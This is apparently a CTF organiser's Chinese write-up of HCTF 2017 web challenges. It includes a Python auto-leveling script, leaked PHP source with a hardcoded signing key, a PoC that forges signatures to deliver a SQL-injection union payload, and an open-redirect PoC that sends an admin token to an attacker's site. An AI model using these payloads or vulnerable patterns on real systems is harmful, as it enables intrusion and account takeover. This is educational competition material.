<li>7&#x3001;h&#x51FD;&#x6570;&#x4F1A;&#x5BF9;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6BCF;&#x4F4D;&#x505A;func&#x51FD;&#x6570;&#x5904;&#x7406;&#xFF0C;&#x7136;&#x540E;&#x62FC;&#x63A5;&#x8D77;&#x6765;&#x3002;  </li>
<li>8&#x3001;&#x7B2C;&#x4E8C;&#x90E8;&#x5206;&#x7531;3&#x5206;&#x5272;&#xFF0C;&#x5DE6;&#x53F3;&#x4E24;&#x8FB9;&#x957F;&#x5EA6;&#x76F8;&#x7B49;&#xFF0C;&#x540C;&#x6837;&#x53EF;&#x4EE5;&#x63A8;&#x7B97;&#x51FA;&#x7ED3;&#x679C;&#x3002;  </li>
<li>9&#x3001;k&#x662F;&#x6211;&#x4E13;&#x95E8;&#x52A0;&#x5165;&#x7684;es6&#x8BED;&#x6CD5;&#x7684;&#x7BAD;&#x5934;&#x8BED;&#x6CD5;&#xFF0C;&#x5BF9;&#x4F20;&#x5165;&#x7684;&#x6BCF;&#x4E2A;&#x5B57;&#x6BCD;&#x505A;&#x4E58;7&#x64CD;&#x4F5C;&#x3002;  </li>
<li>10&#x3001;&#x6700;&#x540E;&#x4E00;&#x9898;&#x901A;&#x8FC7;&#x7B80;&#x5355;&#x7684;&#x5224;&#x65AD;&#xFF0C;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;&#x6700;&#x540E;&#x4E00;&#x90E8;&#x5206;&#x7684;&#x524D;&#x56DB;&#x4F4D;&#x3002;  </li>
<li>11&#x3001;u&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x6307;&#x5B9A;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x6307;&#x5B9A;&#x524D;&#x51E0;&#x4F4D;  </li>
<li>12&#x3001;&#x5269;&#x4E0B;&#x7684;&#x5C31;&#x662F;&#x4E00;&#x8FDE;&#x4E32;&#x7684;&#x6761;&#x4EF6;:  </li>
<li>13&#x3001;&#x9996;&#x5148;&#x662F;&#x4E00;&#x4E9B;&#x5F88;&#x5173;&#x952E;&#x7684;&#x7684;&#x91CD;&#x590D;&#x4F4D;&#xFF0C;&#x7531;&#x4E8E;&#x6211;&#x5199;&#x9519;&#x4E86;&#x4E00;&#x4E9B;&#x4E1C;&#x897F;&#xFF0C;&#x5BFC;&#x81F4;&#x8FD9;&#x91CC;&#x6C38;&#x8FDC;&#x662F;false&#xFF0C;&#x540E;&#x88AB;&#x8FEB;&#x7ED9;&#x51FA;&#x8FD9;&#x51E0;&#x4F4D;.<code>!m || u(b[4][&apos;substr&apos;](5,1),2) == b[4][&apos;substr&apos;](-5,4) || (b[4][&apos;substr&apos;](-2,1) - b[4][&apos;substr&apos;](4,1)) != 1</code>  </li>
<li>14&#x3001;&#x6700;&#x540E;&#x4E00;&#x90E8;&#x5206;&#x662F;&#x96C6;&#x5408;&#x957F;&#x5EA6;&#x3001;&#x4EE5;&#x53CA;&#x90E8;&#x5206;&#x6761;&#x4EF6;&#x5B8C;&#x6210;&#x7684;&#xFF0C;&#x770B;&#x4E0A;&#x53BB;&#x5B58;&#x5728;&#x591A;&#x89E3;&#xFF0C;&#x4F46;&#x4E8B;&#x5B9E;&#x4E0A;&#x662F;&#x80FD;&#x9006;&#x5411;&#x51FA;&#x6765;&#x7ED3;&#x679C;&#x7684;&#x3002;</li>
</ul>
<p>&#x5F53;&#x6211;&#x4EEC;&#x90FD;&#x5B8C;&#x6210;&#x8FD9;&#x90E8;&#x5206;&#x7684;&#x65F6;&#x5019;&#xFF0C;flag&#x5C31;&#x4F1A;&#x88AB;&#x6211;&#x4EEC;&#x89E3;&#x51FA;&#x6765;&#x4E86;&#x3002;</p>
<h3 id="poker"><a name="poker" class="anchor-navigation-ex-anchor" href="#poker"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.4. poker</h3>
<p>&#x8FD9;&#x6B21;&#x60F3;&#x4EE5;&#x6E38;&#x620F;&#x5B89;&#x5168;&#x51FA;&#x4E00;&#x4E9B;&#x9898;&#x76EE;&#xFF0C;&#x4F46;&#x662F;&#x53C8;&#x62C5;&#x5FC3;&#x51FA;&#x7684;&#x592A;&#x96BE;&#xFF0C;&#x5927;&#x5BB6;&#x6CA1;&#x505A;&#x8FC7;&#x7C7B;&#x4F3C;&#x7684;&#x6E38;&#x620F;&#x6F0F;&#x6D1E;&#x6316;&#x6398;(&#x5176;&#x5B9E;&#x662F;&#x4E3A;&#x4E86;&#x5077;&#x61D2;)&#xFF0C;&#x5C31;&#x51FA;&#x4E86;&#x4E00;&#x9053;&#x6218;&#x6597;&#x9891;&#x7387;&#x6CA1;&#x6709;&#x9650;&#x5236;&#x7684;&#x5237;&#x7EA7;&#x6F0F;&#x6D1E;&#x3002;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x53BB;&#x6389;&#x5145;&#x503C;&#x529F;&#x80FD;&#x4EE5;&#x5916;&#x5B8C;&#x6574;&#x7684;&#x6E38;&#x620F;&#xFF0C;&#x6211;&#x53BB;&#x6389;&#x4E86;&#x540E;&#x53F0;&#x5BF9;&#x4E8E;&#x52A0;&#x901F;&#x5668;&#x7684;&#x68C0;&#x6D4B;&#x673A;&#x5236;&#x3002;<br>&#x63D0;&#x793A;&#x7ED9;&#x7684;&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x5728;flag.php&#x91CC;&#x63D0;&#x793A;&#x4E86;</p>
<p><code>getFlag when you are at level 100!!!</code></p>
<p>&#x5347;&#x5230;&#x4E00;&#x767E;&#x7EA7;&#x5C31;&#x53EF;&#x4EE5;&#x62FF;&#x5230;flag&#xFF0C;&#x4F46;&#x662F;&#x6BD4;&#x8D5B;&#x65F6;&#x95F4;&#x7684;48&#x4E2A;&#x5C0F;&#x65F6;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x4E0D;&#x5403;&#x4E0D;&#x559D;&#x4E5F;&#x662F;&#x5347;&#x4E0D;&#x5230;100&#x7EA7;&#x7684;&#xFF0C;ctf&#x672C;&#x6765;&#x5C31;&#x662F;&#x4E00;&#x4E2A;hack game&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x5206;&#x6790;&#x4ED6;&#x7684;&#x6E38;&#x620F;&#x673A;&#x5236;&#x3002;&#x8FD9;&#x4E2A;&#x7248;&#x672C;&#x7684;poker2&#x6CA1;&#x6709;&#x6218;&#x6597;&#x9891;&#x7387;&#x9650;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x9AD8;&#x901F;&#x65E0;&#x9650;&#x6218;&#x6597;&#xFF0C;&#x811A;&#x672C;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x4F46;&#x662F;&#x8FD8;&#x9700;&#x8981;&#x5206;&#x6790;&#x6E38;&#x620F;&#x7684;&#x7EC6;&#x8282;&#x3002;&#x4F17;&#x591A;&#x91CE;&#x602A;&#x5730;&#x56FE;&#x91CC;&#x6709;&#x4E00;&#x4E2A;&#x53EB;&#x5723;&#x8BDE;&#x5C0F;&#x5C4B;&#x7684;&#x6302;&#x673A;&#x5730;&#x56FE;&#xFF0C;&#x4F24;&#x5BB3;&#x4F4E;&#x7ECF;&#x9A8C;&#x9AD8;&#xFF0C;&#x5199;&#x597D;&#x6302;&#x673A;&#x811A;&#x672C;&#x8FD8;&#x662F;&#x5F88;&#x7B80;&#x5355;&#x7684;&#x3002;</p>
<pre><code>    import requests
    import re
    from time import sleep
    host = &quot;petgame.2017.hctf.io&quot;

    headers = {
        &quot;Cookie&quot;:&quot;PHPSESSID=c4gn8hav06nsv43bo65tlfkto3&quot;
    }
    def getFight(host, headers):
        url = &quot;http://&quot;+host+&quot;/function/Fight_Mod.php?p=37&amp;bid=5226&amp;rd=0.5365947475076844&quot;
        req = requests.get(url = url, headers = headers)
        html = req.content
        gid = re.findall(&quot;gg=\[.*,(.*)\]&quot;,html)
        if len(gid)&gt;0:
            gid = gid[0]
            attack(gid, 4, host, headers)
        else:
            return False

    def attack(gid, times, host, headers):
        url = &quot;http://&quot;+host+&quot;/function/FightGate.php?id=1&amp;g=&quot;+str(gid)+&quot;&amp;checkwg=checked&amp;rd=0.34966725314993186&quot;
        for i in xrange(0,times-1):
            req = requests.get(url = url, headers = headers)
            html = req.content
            print html

    while True:
        getFight(host,headers)
    #    sleep(0.1)

    #attack(86,url,headers)
</code></pre><p>&#x5176;&#x5B9E;&#x8FD8;&#x6709;&#x5176;&#x4ED6;&#x89E3;&#x6CD5;&#xFF0C;&#x5C31;&#x662F;&#x5728;poker-poker&#x4E00;&#x9898;&#x4E2D;&#x627E;&#x5230;&#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x4E00;&#x767E;&#x7EA7;&#x7684;&#x73A9;&#x5BB6;&#x7684;&#x5BC6;&#x7801;&#x662F;&#x5F31;&#x53E3;&#x4EE4;(md5&#x53EF;&#x67E5;)&#x5219;&#x53EF;&#x4EE5;&#x8FDB;&#x5165;&#x5176;&#x4ED6;&#x4EBA;&#x8D26;&#x53F7;&#x83B7;&#x5F97;flag&#x3002;&#x6211;&#x7279;&#x610F;&#x628A;poker2&#x4E00;&#x9898;&#x653E;&#x5728;&#x7B2C;&#x4E8C;&#x5C42;&#xFF0C;poker-poker&#x5728;&#x7B2C;&#x4E09;&#x5C42;&#xFF0C;&#x4F46;&#x662F;&#x8FD8;&#x662F;&#x6709;&#x4EBA;&#x627E;&#x5230;&#x4E86;&#x975E;&#x9884;&#x671F;&#x7684;&#x6CE8;&#x5165;&#x70B9;(&#x6CE8;&#x518C;&#x5904;)&#xFF0C;&#x63D0;&#x524D;&#x83B7;&#x53D6;&#x4E86;&#x522B;&#x4EBA;&#x7684;session&#xFF0C;&#x5728;&#x6211;&#x5220;&#x9664;&#x4E00;&#x767E;&#x7EA7;&#x8D26;&#x53F7;&#x524D;&#x83B7;&#x5F97;flag&#x3002;</p>
<h3 id="poker-poker"><a name="poker-poker" class="anchor-navigation-ex-anchor" href="#poker-poker"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.5. poker-poker</h3>
<p>&#x8FD9;&#x9898;&#x5C31;&#x6BD4;&#x8F83;&#x96BE;&#x53D7;&#x4E86;&#xFF0C;&#x770B;&#x4E86;&#x5927;&#x5BB6;&#x4F20;&#x4E0A;&#x6765;&#x7684;wp&#xFF0C;&#x6CA1;&#x6709;&#x4E00;&#x4EFD;&#x662F;&#x9884;&#x671F;&#x89E3;&#x3002;&#x7531;&#x4E8E;&#x6E38;&#x620F;&#x7A0B;&#x5E8F;&#x6BD4;&#x8F83;&#x591A;&#xFF0C;&#x6211;&#x4E5F;&#x6CA1;&#x5168;&#x90E8;&#x770B;&#x8FC7;&#xFF0C;&#x5C31;&#x627E;&#x4E86;&#x4E00;&#x5904;&#x9690;&#x853D;&#x7684;&#x6709;&#x56DE;&#x663E;&#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x4F46;&#x662F;&#x6709;&#x4E00;&#x4E9B;&#x524D;&#x7F6E;&#x6761;&#x4EF6;&#x3002;<br>&#x9898;&#x76EE;&#x63D0;&#x793A;&#x662F;pspt&#xFF0C;&#x8BBF;&#x95EE;&#x53D1;&#x73B0;&#x8DF3;&#x8F6C;&#x5230;pspt/&#x5E76;&#x4E14;&#x72B6;&#x6001;403&#xFF0C;&#x8BF4;&#x660E;&#x5B58;&#x5728;pspt&#x76EE;&#x5F55;&#x3002;<br>pspt&#x76EE;&#x5F55;&#x4E0B;&#x5B58;&#x5728;robots.txt&#x3002;</p>
<pre><code>    Disallow: /pspt/inf/queryUserRole.php
    Sitemap: http://domain.com/sitemap.xml
</code></pre><p>&#x76F4;&#x63A5;&#x8BBF;&#x95EE;/pspt/inf/queryUserRole.php&#x63D0;&#x793A;error1&#x3002;&#x8BE5;&#x76EE;&#x5F55;&#x4E0B;&#x5B58;&#x5728;.bak&#x6587;&#x4EF6;&#xFF0C;&#x6CC4;&#x6F0F;&#x4E86;&#x6E90;&#x7801;&#x3002;</p>
<pre><code>    &lt;?php
    require_once(dirname(dirname(dirname(__FILE__))).&apos;/config/config.game.php&apos;);
    if (empty($_GET[&apos;user_account&apos;]) || empty($_GET[&apos;valid_date&apos;]) || empty($_GET[&apos;sign&apos;])) {
        die(&apos;error1&apos;);
    }

    $time = time();
    if ($_GET[&apos;valid_date&apos;] &lt;= $time) {
        die(&apos;error2&apos;);
    }

    $encryKey = &apos;7sl+kb9adDAc7gLuv31MeEFPBMJZdRZyAx9eEmXSTui4423hgGfXF1pyM&apos;;
    $flag = md5($_GET[&apos;user_account&apos;].$_GET[&apos;valid_date&apos;].$encryKey);
    if ($flag != $_GET[&apos;sign&apos;]) {
        die(&apos;error3&apos;);
    }

    $arr = $_pm[&apos;mysql&apos;] -&gt; getOneRecord(&quot;SELECT id,nickname FROM player WHERE name = &apos;{$_GET[&apos;user_account&apos;]}&apos;&quot;);

    if (!is_array($arr)) {
        die(&apos;error4&apos;);
    }

    $str = $arr[&apos;id&apos;].&apos;&amp;&apos;.$arr[&apos;nickname&apos;];
    $newstr = iconv(&apos;utf8&apos;,&apos;utf-8&apos;,$str);
    echo $newstr;
    unset($time,$arr,$str);
    ?&gt;
</code></pre><p>&#x6B64;&#x5904;&#x6CC4;&#x6F0F;&#x4E86;encryKey&#xFF0C;&#x53EA;&#x8981;&#x6709;&#x8FD9;&#x4E2A;encryKey&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x6E90;&#x7801;&#x5199;&#x51FA;&#x6CE8;&#x5165;payload&#x3002;<br>poc:</p>
<pre><code>    import requests
    import time
    import hashlib
    import urllib2

    def getMd5(data):
        data = str(data)
        t = hashlib.md5()
        t.update(data)
        return t.hexdigest()

    def hack(payload=&quot;admin&quot;):
        user_account = urllib2.quote(payload)
        valid_date = int(time.time())+10000
        sign = getSign(user_account, valid_date)
        url = &quot;http://petgame.2017.hctf.io/pspt/inf/queryUserRole.php?user_account=&quot;+str(user_account)+&quot;&amp;valid_date=&quot;+str(valid_date)+&quot;&amp;sign=&quot;+sign
        req = requests.get(url = url)
        print req.content

    def getSign(user_account, valid_date):
        user_account = urllib2.unquote(user_account)
        encryKey = &apos;7sl+kb9adDAc7gLuv31MeEFPBMJZdRZyAx9eEmXSTui4423hgGfXF1pyM&apos;
        sign = getMd5(str(user_account) + str(valid_date) + encryKey)
        return sign

    hack(&quot;adminss&apos; union all select 111,flag from hctf.flag2#&quot;)
</code></pre><p>flag&#x5C31;&#x5728;hctf&#x5E93;&#x91CC;&#x7684;hctf2&#x8868;&#x91CC;&#x3002;<br>&#x800C;&#x5927;&#x5BB6;&#x627E;&#x5230;&#x7684;&#x5176;&#x4ED6;&#x6CE8;&#x5165;&#x70B9;</p>
<h3 id="a-world-restored--a-world-restored-again"><a name="a-world-restored--a-world-restored-again" class="anchor-navigation-ex-anchor" href="#a-world-restored--a-world-restored-again"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.6. A World Restored &amp; A World Restored Again</h3>
<pre><code>    A World Restored
    Description:
    nothing here or all the here ps:flag in admin cookie 
    flag is login as admin
    URL http://messbox.2017.hctf.io
    Now Score 674.44
    Team solved 7

    A World Restored Again
    Description: 
    New Challenge !! 
    hint: flag only from admin bot
    URL http://messbox.2017.hctf.io
    Now Score 702.6
    Team solved 6
</code></pre><p>A World Restored&#x5728;&#x51FA;&#x9898;&#x601D;&#x8DEF;&#x672C;&#x8EAB;&#x662F;&#x6765;&#x81EA;&#x4E8E;uber&#x5728;10&#x6708;14&#x53F7;&#x516C;&#x5F00;&#x7684;&#x4E00;&#x4E2A;&#x6F0F;&#x6D1E;<a href="https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html" target="_blank">https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html</a>&#xFF0C;&#x4E3A;&#x4E86;&#x80FD;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x6A21;&#x62DF;&#x771F;&#x5B9E;&#x73AF;&#x5883;&#xFF0C;&#x6211;&#x8FD9;&#x4E2A;&#x4E0D;&#x4E13;&#x4E1A;&#x7684;Web&#x5F00;&#x53D1;&#x53EA;&#x80FD;&#x5F3A;&#x884C;&#x4E0A;&#x624B;&#x5B9E;&#x73B0;&#x7AD9;&#x5E93;&#x5206;&#x79BB;&#x3002;</p>
<p>&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x90E8;&#x5206;&#x975E;&#x9884;&#x671F;&#xFF0C;&#x4E5F;&#x90FD;&#x662F;&#x56E0;&#x4E3A;&#x7AD9;&#x5E93;&#x5206;&#x79BB;&#x5B9E;&#x73B0;&#x7684;&#x4E0D;&#x597D;&#x800C;&#x5BFC;&#x81F4;&#x7684;&#x3002;&#xFF08;&#x66F4;&#x5F00;&#x653E;&#x7684;&#x9898;&#x76EE;&#x73AF;&#x5883;&#xFF0C;&#x5BFC;&#x81F4;&#x4E86;&#x5F88;&#x591A;&#x53EF;&#x80FD;&#xFF0C;&#x6216;&#x8BB8;&#x8FD9;&#x6CA1;&#x4EC0;&#x4E48;&#x4E0D;&#x597D;&#x7684;&#xFF1F;</p>
<p>&#x6574;&#x4E2A;&#x7AD9;&#x7684;&#x7ED3;&#x6784;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;<br>1&#x3001;auth&#x7AD9;&#x8D1F;&#x8D23;&#x7528;&#x6237;&#x6570;&#x636E;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5305;&#x62EC;&#x767B;&#x9646;&#x9A8C;&#x8BC1;&#x3001;&#x6CE8;&#x518C;&#x7B49;&#xFF0C;&#x662F;&#x6570;&#x636E;&#x5E93;&#x6240;&#x5728;&#x7AD9;&#x3002;<br>2&#x3001;messbox&#x7AD9;&#x8D1F;&#x8D23;&#x7528;&#x6237;&#x7684;&#x5404;&#x79CD;&#x64CD;&#x4F5C;&#xFF0C;&#x4F46;&#x4E0D;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x3002;</p>
<p>&#x8FD9;&#x91CC;auth&#x7AD9;&#x4E0E;messbox&#x7AD9;&#x5C5E;&#x4E8E;&#x4E24;&#x4E2A;&#x5B8C;&#x5168;&#x4E0D;&#x540C;&#x7684;&#x57DF;&#xFF0C;&#x53D7;&#x5230;<strong>&#x540C;&#x6E90;&#x7B56;&#x7565;</strong>&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x6709;&#x529E;&#x6CD5;&#x6765;&#x6C9F;&#x901A;&#x4E24;&#x4E2A;&#x7AD9;&#x3002;</p>
<p>&#x800C;&#x8FD9;&#x91CC;&#xFF0C;&#x6211;&#x9009;&#x62E9;&#x4F7F;&#x7528;token&#x505A;&#x7528;&#x6237;&#x767B;&#x9646;&#x7684;&#x6821;&#x9A8C;+jsonp&#x6765;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x6570;&#x636E;&#x3002;&#x7AD9;&#x70B9;&#x7ED3;&#x6784;&#x5982;&#x4E0B;:</p>
<p>     <a href="http://static.zybuluo.com/LoRexxar/bp6f3b81h84qt19qc00ws80q/image.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/bp6f3b81h84qt19qc00ws80q/image.png" alt="">
     </a></p>
<p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#xFF0C;messbox&#x767B;&#x9646;&#x8D26;&#x53F7;&#x5B8C;&#x5168;&#x53D7;&#x5230;token&#x6821;&#x9A8C;&#xFF0C;&#x5373;&#x4F7F;&#x4F60;&#x5728;&#x5B8C;&#x5168;&#x4E0D;&#x77E5;&#x9053;&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x83B7;&#x53D6;&#x8BE5;token&#x5C31;&#x53EF;&#x4EE5;&#x767B;&#x9646;&#x8D26;&#x53F7;&#x3002;</p>
<p>&#x90A3;&#x4E48;&#x600E;&#x4E48;&#x83B7;&#x53D6;token&#x767B;&#x9646;admin&#x8D26;&#x53F7;&#x5C31;&#x662F;&#x7B2C;&#x4E00;&#x9898;&#x3002;</p>
<p>&#x800C;&#x7B2C;&#x4E8C;&#x9898;&#xFF0C;&#x6F0F;&#x6D1E;&#x70B9;&#x5C31;&#x662F;&#x4E0A;&#x9762;&#x6587;&#x7AE0;&#x4E2D;&#x5199;&#x7684;&#x90A3;&#x6837;&#xFF0C;&#x53CD;&#x5C04;&#x6027;&#x7684;domxss&#xFF0C;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x670D;&#x52A1;&#x7AEF;&#x7684;flag&#x3002;</p>
<p>&#x4E3A;&#x4E86;&#x4E24;&#x4E2A;flag&#x4E92;&#x4E0D;&#x5E72;&#x6270;&#xFF0C;&#x6211;&#x5BF9;&#x670D;&#x52A1;&#x7AEF;&#x505A;&#x4E86;&#x4E00;&#x5B9A;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x8D1F;&#x8D23;&#x5904;&#x7406;flag&#x7684;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>    $flag1 = &quot;hctf{xs5_iz_re4lly_complex34e29f}&quot;;
    $flag2 = &quot;hctf{mayb3_m0re_way_iz_best_for_ctf}&quot;;

    if(!empty($_SESSION[&apos;user&apos;])){
        if($_SESSION[&apos;user&apos;] === &apos;hctf_admin_LoRexxar2e23322&apos;){
                    setcookie(&quot;flag&quot;, $flag, time()+3600*48,&quot; &quot;,&quot;messbox.2017.hctf.io&quot;, 0, true);
            }

        if($_SESSION[&apos;user&apos;] === &apos;hctf_admin_LoRexxar2e23322&apos; &amp;&amp; $_GET[&apos;check&apos;]==&quot;233e&quot;){
            setcookie(&quot;flag2&quot;, $flag2, time()+3600*48,&quot; &quot;,&quot;.2017.hctf.io&quot;);
        }
    }
</code></pre><p>&#x53EF;&#x4EE5;&#x5F88;&#x660E;&#x663E;&#x7684;&#x770B;&#x51FA;&#x6765;&#xFF0C;flag1&#x662F;httponly&#x5E76;&#x5728;messbox&#x57DF;&#x4E0B;&#xFF0C;&#x53EA;&#x80FD;&#x767B;&#x9646;&#x624D;&#x80FD;&#x67E5;&#x770B;&#x3002;flag2&#x6211;&#x8BBE;&#x7F6E;&#x4E86;check&#x4F4D;&#xFF0C;&#x53EA;&#x6709;bot&#x624D;&#x4F1A;&#x8BBF;&#x95EE;&#x8FD9;&#x4E2A;&#x9875;&#x9762;&#xFF0C;&#x8FD9;&#x6837;&#x53EA;&#x6709;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x6027;xss&#xFF0C;&#x624D;&#x80FD;&#x5F97;&#x5230;flag&#x3002;</p>
<p>&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x56DE;&#x5230;&#x9898;&#x76EE;&#x3002;</p>
<h4 id="a-world-restored"><a name="a-world-restored" class="anchor-navigation-ex-anchor" href="#a-world-restored"><i class="fa fa-link" aria-hidden="true"></i></a><a name="a-world-restored" class="plugin-anchor" href="#a-world-restored"><i class="fa fa-link" aria-hidden="true"></i></a>A World Restored</h4>
<pre><code>    A World Restored
    Description:
    nothing here or all the here ps:flag in admin cookie 
    flag is login as admin
    URL http://messbox.2017.hctf.io
    Now Score 674.44
    Team solved 7
</code></pre><p>&#x8FD9;&#x9053;&#x9898;&#x76EE;&#x5728;&#x6BD4;&#x8D5B;&#x7ED3;&#x675F;&#x65F6;&#xFF0C;&#x53EA;&#x6709;7&#x53EA;&#x961F;&#x4F0D;&#x6700;&#x7EC8;&#x5B8C;&#x6210;&#x4E86;&#xFF0C;&#x975E;&#x5E38;&#x51FA;&#x4E4E;&#x6211;&#x7684;&#x610F;&#x6599;&#xFF0C;&#x56E0;&#x4E3A;&#x6F0F;&#x6D1E;&#x672C;&#x8EAB;&#x975E;&#x5E38;&#x6709;&#x610F;&#x601D;&#x3002;&#xFF08;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x662F;ROIS&#x53D1;&#x73B0;&#x7684;&#xFF09;</p>
<p>&#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x5B9E;&#x73B0;token&#xFF0C;&#x6211;&#x8BBE;&#x5B9A;&#x4E86;token&#x4E0D;&#x53EF;&#x9006;&#x7684;&#x4E8C;&#x91CD;&#x9A8C;&#x8BC1;&#x7B56;&#x7565;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x9898;&#x76EE;&#x4E2D;&#x6211;&#x52A0;&#x5165;&#x4E86;&#x4E00;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x8BA9;&#x6211;&#x4EEC;&#x56DE;&#x987E;&#x4E00;&#x4E0B;&#x3002;</p>
<p>auth&#x57DF;&#x4E2D;&#x7684;login.php&#xFF0C;&#x6211;&#x52A0;&#x5165;&#x4E86;&#x8FD9;&#x6837;&#x4E00;&#x6BB5;&#x4EE3;&#x7801;</p>
<pre><code>    if(!empty($_GET[&apos;n_url&apos;])){
            $n_url = trim($_GET[&apos;n_url&apos;]);
            echo &quot;&lt;script nonce=&apos;{$random}&apos;&gt;window.location.href=&apos;&quot;.$n_url.&quot;?token=&quot;.$usertoken.&quot;&apos;&lt;/script&gt;&quot;;
            exit;
        }else{
            // header(&quot;location: http://messbox.hctf.com?token=&quot;.$usertoken);
            echo &quot;&lt;script nonce=&apos;{$random}&apos;&gt;window.location.href=&apos;http://messbox.2017.hctf.io?token=&quot;.$usertoken.&quot;&apos;&lt;/script&gt;&quot;;
            exit;
        }
</code></pre><p>&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4E5F;&#x662F;&#x4E24;&#x4E2A;&#x6F0F;&#x6D1E;&#x7684;&#x6838;&#x5FC3;&#x6F0F;&#x6D1E;&#x70B9;&#xFF0C;&#x5047;&#x8BBE;&#x4F60;&#x5728;&#x672A;&#x767B;&#x5F55;&#x72B6;&#x6001;&#x4E0B;&#x8BBF;&#x95EE;messbox&#x57DF;&#x4E0B;&#x7684;user.php&#x6216;&#x8005;report.php&#x8FD9;&#x4E24;&#x4E2A;&#x9875;&#x9762;&#xFF0C;&#x90A3;&#x4E48;&#x56E0;&#x4E3A;&#x672A;&#x767B;&#x5F55;&#xFF0C;&#x9875;&#x9762;&#x4F1A;&#x8DF3;&#x8F6C;&#x5230;auth&#x57DF;&#x5E76;&#x643A;&#x5E26;n_url&#xFF0C;&#x5982;&#x679C;&#x83B7;&#x53D6;&#x5230;&#x767B;&#x9646;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4F1A;&#x62FC;&#x63A5;token&#x4F20;&#x56DE;messbox&#x57DF;&#xFF0C;&#x5E76;&#x8D4B;&#x4E88;&#x767B;&#x9646;&#x72B6;&#x6001;&#x3002;</p>
<p>&#x7B80;&#x5355;&#x7684;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>`&#x672A;&#x767B;&#x5F55;-&gt;&#x83B7;&#x53D6;&#x5F53;&#x524D;URL-&gt;&#x8DF3;&#x8F6C;&#x81F3;auth-&gt;&#x83B7;&#x53D6;&#x767B;&#x9646;&#x72B6;&#x6001;-&gt;&#x643A;&#x5E26;token&#x8DF3;&#x8F6C;&#x5230;&#x521A;&#x624D;&#x83B7;&#x53D6;&#x7684;URL-&gt;messbox&#x767B;&#x9646;&#x6210;&#x529F;`
</code></pre><p>&#x5F53;&#x7136;&#xFF0C;&#x8FD9;&#x5176;&#x4E2D;&#x662F;&#x6709;&#x6F0F;&#x6D1E;&#x7684;&#x3002;</p>
<p>&#x670D;&#x52A1;&#x7AEF;bot&#x5FC5;&#x7136;&#x767B;&#x9646;&#x4E86;admin&#x8D26;&#x53F7;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x8BF7;&#x6C42;login.php&#x5E76;&#x5236;&#x5B9A;&#x4E0B;&#x4E00;&#x6B65;&#x8DF3;&#x8F6C;&#x7684;URL&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x62FC;&#x63A5;&#x4E0A;&#x7684;token&#xFF01;</p>
<pre><code>poc

`http://auth.2017.hctf.io/login.php?n_url=http://{you_website}`
</code></pre><p>&#x5F97;&#x5230;token&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x767B;&#x9646;messbox&#x57DF;&#xFF0C;&#x6210;&#x529F;&#x767B;&#x9646;admin</p>
<h4 id="a-world-restored-again"><a name="a-world-restored-again" class="anchor-navigation-ex-anchor" href="#a-world-restored-again"><i class="fa fa-link" aria-hidden="true"></i></a><a name="a-world-restored-again" class="plugin-anchor" href="#a-world-restored-again"><i class="fa fa-link" aria-hidden="true"></i></a>A World Restored Again</h4>
<pre><code>    A World Restored Again
    Description: 
    New Challenge !! 
    hint: flag only from admin bot
    URL http://messbox.2017.hctf.io
    Now Score 702.6
    Team solved 6
